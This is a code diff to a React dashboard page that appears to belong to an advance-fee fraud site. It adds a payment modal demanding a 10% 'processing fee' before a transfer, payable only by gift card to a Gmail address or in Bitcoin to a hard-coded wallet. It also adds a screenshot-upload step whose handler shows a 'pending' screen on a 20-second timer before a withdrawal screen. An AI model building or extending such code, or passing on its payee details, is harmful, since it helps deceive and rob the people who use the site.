@@ -15,6 +15,10 @@ export default function DashboardPage() {
   const [showPaymentModal, setShowPaymentModal] = useState(false);
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('');
   const [showConfetti, setShowConfetti] = useState(false);
+  const [showUploadModal, setShowUploadModal] = useState(false);
+  const [uploadedFile, setUploadedFile] = useState(null);
+  const [uploadError, setUploadError] = useState("");
+
   const [windowSize, setWindowSize] = useState({
     width: typeof window !== 'undefined' ? window.innerWidth : 0,
     height: typeof window !== 'undefined' ? window.innerHeight : 0,
@@ -255,6 +259,36 @@ export default function DashboardPage() {
     setSelectedPaymentMethod(method);
   };
 
+
+const handleFileUpload = (e) => {
+  const file = e.target.files[0];
+  if (file) {
+    setUploadedFile(file);
+  }
+};
+
+
+const handlePaymentConfirmations = () => {
+  if (!uploadedFile) {
+    setUploadError("Upload payment proof before submitting.");
+    return;
+  }
+
+  setUploadError(""); // Clear previous error
+
+  // Proceed with modal transitions
+  setShowUploadModal(false);
+  setShowPendingModal(true);
+  setShowPaymentModal(false);
+
+  setTimeout(() => {
+    setShowPendingModal(false);
+    setShowWithdrawalModal(true);
+  }, 20000);
+};
+
+  
+  
   const calculateFee = () => {
     const amount = parseFloat(transferForm.amount.replace(/[^0-9.-]+/g, ''));
     return (amount * 0.1).toFixed(2);
@@ -668,144 +702,164 @@ export default function DashboardPage() {
 
       {/* Payment Confirmation Modal */}
       {showPaymentModal && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
-          {showConfetti && (
-            <Confetti
-              width={windowSize.width}
-              height={windowSize.height}
-              recycle={false}
-              numberOfPieces={500}
-              gravity={0.3}
-            />
-          )}
-          <div className="bg-white/10 backdrop-blur-sm px-4 md:px-6 rounded-lg shadow-md w-full max-w-md max-h-[90vh] overflow-y-auto">
-            <div className="flex justify-between items-center mb-4 sticky top-0 bg-black/80 -mx-4 md:-mx-6 px-4 md:px-6 py-2">
-              <h2 className="text-xl font-semibold text-yellow-500">Complete Payment</h2>
-              <button 
-                onClick={() => {
-                  setShowPaymentModal(false);
-                  setSelectedPaymentMethod('');
-                  setHasCopiedDetails(false);
-                  setShowWarning(false);
-                }}
-                className="text-white hover:text-yellow-500"
-              >
-                <svg 
-                  className="w-6 h-6" 
-                  fill="none" 
-                  stroke="currentColor" 
-                  viewBox="0 0 24 24"
-                >
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M6 18L18 6M6 6l12 12" 
-                  />
-                </svg>
-              </button>
-            </div>
-            <div className="space-y-4 pb-7 text-sm">
-              <div className="bg-white/5 p-3 md:p-4 rounded-lg">
-                <p className="text-gray-200 mb-2 text-yellow-500">Receiver Details: </p>
-                <div className="space-y-2">
-                  <p className="text-gray-200">Bank Name: <span className="text-white">{transferForm.bank}</span></p>
-                  <p className="text-gray-200">Receipient Name: <span className="text-white">{transferForm.accountName}</span></p>
-                  <p className="text-gray-200">IBAN/Account Number: <span className="text-white">{transferForm.accountNumber}</span></p>
-                  <p className="text-gray-200">Routing Number: <span className="text-white">{transferForm.routingNumber}</span></p>
-                  <p className="text-gray-200">Transfer Amount: <span className="text-white">${transferForm.amount}</span></p>
-                </div>
-              </div>
+  <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
+    {showConfetti && (
+      <Confetti
+        width={windowSize.width}
+        height={windowSize.height}
+        recycle={false}
+        numberOfPieces={500}
+        gravity={0.3}
+      />
+    )}
+    <div className="bg-white/10 backdrop-blur-sm px-4 md:px-6 rounded-lg shadow-md w-full max-w-md max-h-[90vh] overflow-y-auto">
+      <div className="flex justify-between items-center mb-4 sticky top-0 bg-black/80 -mx-4 md:-mx-6 px-4 md:px-6 py-2">
+        <h2 className="text-xl font-semibold text-yellow-500">Complete Payment</h2>
+        <button
+          onClick={() => {
+            setShowPaymentModal(false);
+            setSelectedPaymentMethod('');
+            setHasCopiedDetails(false);
+            setShowWarning(false);
+          }}
+          className="text-white hover:text-yellow-500"
+        >
+          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+          </svg>
+        </button>
+      </div>
 
-              <div className="bg-white/5 p-3 md:p-4 rounded-lg">
-                <p className="text-gray-200 mb-2 text-yellow-500">Payment Information:</p>
-                <div className="space-y-2">
-                  <p className="text-sm text-gray-300">Note: The processing fee is <span className="text-green-500">${calculateFee()}</span> (10%) of your transfer amount and must be paid using one of the payment methods below.</p>
-                 
-                </div>
-              </div>
-              
-              <div className="space-y-4">
-                <div 
-                  className={`p-3 md:p-4 rounded-lg border ${
-                    selectedPaymentMethod === 'giftcard' ? 'border-yellow-500 bg-yellow-500/10' : 'border-white/10'
-                  } transition-colors duration-300`}
-                >
-                  <button
-                    onClick={() => handlePaymentMethodSelect('giftcard')}
-                    className="w-full flex items-center justify-between"
-                  >
-                    <span className="text-white">Pay with Gift Card</span>
-                    <span className="text-yellow-500">→</span>
-                  </button>
-                  {selectedPaymentMethod === 'giftcard' && (
-                    <div className="mt-4">
-                      <p className="text-gray-200 mb-2">Send gift card to:</p>
-                      <div className="relative">
-                        <div className="flex items-center bg-black/50 rounded">
-                          <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">primecapitalorg@gmail.com</code>
-                          <button
-                            onClick={() => copyToClipboard('primecapitalorg@gmail.com', 'giftcard')}
-                            className="p-2 text-yellow-500 hover:text-yellow-400"
-                          >
-                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
-                            </svg>
-                          </button>
-                        </div>
-                      </div>
-                      <button
-                        onClick={handlePaymentConfirmation}
-                        className="w-full mt-4 bg-yellow-500 hover:bg-yellow-700 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
-                      >
-                        Payment Made
-                      </button>
-                    </div>
-                  )}
-                </div>
-
-                <div 
-                  className={`p-3 md:p-4 rounded-lg border ${
-                    selectedPaymentMethod === 'bitcoin' ? 'border-yellow-500 bg-yellow-500/10' : 'border-white/10'
-                  } transition-colors duration-300`}
-                >
-                  <button
-                    onClick={() => handlePaymentMethodSelect('bitcoin')}
-                    className="w-full flex items-center justify-between"
-                  >
-                    <span className="text-white">Pay with Bitcoin</span>
-                    <span className="text-yellow-500">→</span>
-                  </button>
-                  {selectedPaymentMethod === 'bitcoin' && (
-                    <div className="mt-4">
-                      <p className="text-gray-200 mb-2">Send Bitcoin to:</p>
-                      <div className="relative">
-                        <div className="flex items-center bg-black/50 rounded">
-                          <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz</code>
-                          <button
-                            onClick={() => copyToClipboard('bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz', 'bitcoin')}
-                            className="p-2 text-yellow-500 hover:text-yellow-400"
-                          >
-                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
-                            </svg>
-                          </button>
-                        </div>
-                      </div>
-                      <button
-                        onClick={handlePaymentConfirmation}
-                        className="w-full mt-4 bg-yellow-500 hover:bg-yellow-700 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
-                      >
-                        Payment Made
-                      </button>
-                    </div>
-                  )}
-                </div>
-              </div>
-            </div>
+      <div className="space-y-4 pb-7 text-sm">
+        <div className="bg-white/5 p-3 md:p-4 rounded-lg">
+          <p className="text-gray-200 mb-2 text-yellow-500">Receiver Details: </p>
+          <div className="space-y-2">
+            <p className="text-gray-200">Bank Name: <span className="text-white">{transferForm.bank}</span></p>
+            <p className="text-gray-200">Receipient Name: <span className="text-white">{transferForm.accountName}</span></p>
+            <p className="text-gray-200">IBAN/Account Number: <span className="text-white">{transferForm.accountNumber}</span></p>
+            <p className="text-gray-200">Routing Number: <span className="text-white">{transferForm.routingNumber}</span></p>
+            <p className="text-gray-200">Transfer Amount: <span className="text-white">${transferForm.amount}</span></p>
           </div>
         </div>
+
+        <div className="bg-white/5 p-3 md:p-4 rounded-lg">
+          <p className="text-gray-200 mb-2 text-yellow-500">Payment Information:</p>
+          <div className="space-y-2">
+            <p className="text-sm text-gray-300">
+              Note: The processing fee is <span className="text-green-500">${calculateFee()}</span> (10%) of your transfer amount and must be paid using one of the payment methods below.
+            </p>
+          </div>
+        </div>
+
+        <div className="space-y-4">
+          <div
+            className={`p-3 md:p-4 rounded-lg border ${
+              selectedPaymentMethod === 'giftcard' ? 'border-yellow-500 bg-yellow-500/10' : 'border-white/10'
+            } transition-colors duration-300`}
+          >
+            <button
+              onClick={() => handlePaymentMethodSelect('giftcard')}
+              className="w-full flex items-center justify-between"
+            >
+              <span className="text-white">Pay with Gift Card</span>
+              <span className="text-yellow-500">→</span>
+            </button>
+            {selectedPaymentMethod === 'giftcard' && (
+              <div className="mt-4">
+                <p className="text-gray-200 mb-2">Send gift card to:</p>
+                <div className="relative">
+                  <div className="flex items-center bg-black/50 rounded">
+                    <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">primecapitalorg@gmail.com</code>
+                    <button
+                      onClick={() => copyToClipboard('primecapitalorg@gmail.com', 'giftcard')}
+                      className="p-2 text-yellow-500 hover:text-yellow-400"
+                    >
+                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+                      </svg>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            )}
+          </div>
+
+          <div
+            className={`p-3 md:p-4 rounded-lg border ${
+              selectedPaymentMethod === 'bitcoin' ? 'border-yellow-500 bg-yellow-500/10' : 'border-white/10'
+            } transition-colors duration-300`}
+          >
+            <button
+              onClick={() => handlePaymentMethodSelect('bitcoin')}
+              className="w-full flex items-center justify-between"
+            >
+              <span className="text-white">Pay with Bitcoin</span>
+              <span className="text-yellow-500">→</span>
+            </button>
+            {selectedPaymentMethod === 'bitcoin' && (
+              <div className="mt-4">
+                <p className="text-gray-200 mb-2">Send Bitcoin to:</p>
+                <div className="relative">
+                  <div className="flex items-center bg-black/50 rounded">
+                    <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz</code>
+                    <button
+                      onClick={() => copyToClipboard('bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz', 'bitcoin')}
+                      className="p-2 text-yellow-500 hover:text-yellow-400"
+                    >
+                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+                      </svg>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* ✅ Unified Upload Screenshot Button */}
+        <button
+          onClick={() => setShowUploadModal(true)}
+          className="w-full mt-6 bg-yellow-500 hover:bg-yellow-700 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
+        >
+          Upload Payment Screenshot
+        </button>
+      </div>
+    </div>
+  </div>
+)}
+
+{showUploadModal && (
+  <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4">
+    <div className="bg-white/10 backdrop-blur-sm rounded-lg p-6 w-full max-w-sm">
+      <h3 className="text-lg font-semibold text-yellow-500 mb-4">Upload Screenshot</h3>
+      <input
+        type="file"
+        accept="image/*"
+        onChange={(e) => {
+          setUploadedFile(e.target.files[0]);
+          setUploadError(""); // Clear error when file is selected
+        }}
+      
+        className="block w-full cursor-pointer text-white text-sm mb-1"
+      />
+      <div className="flex justify-end gap-3">
+      <button
+          onClick={handlePaymentConfirmations}
+          className="mt-2 px-4 py-2 bg-yellow-500 text-black rounded hover:bg-yellow-700 transition"
+        >
+        Submit
+      </button>
+
+
+      </div>
+      {uploadError && (
+        <p className="text-red-500 text-center text-[12px] mt-5">{uploadError}</p>
       )}
+    </div>
+  </div>
+)}
+
       
       <div className="fixed bottom-[5px] right-[10px] z-50">
         <button 
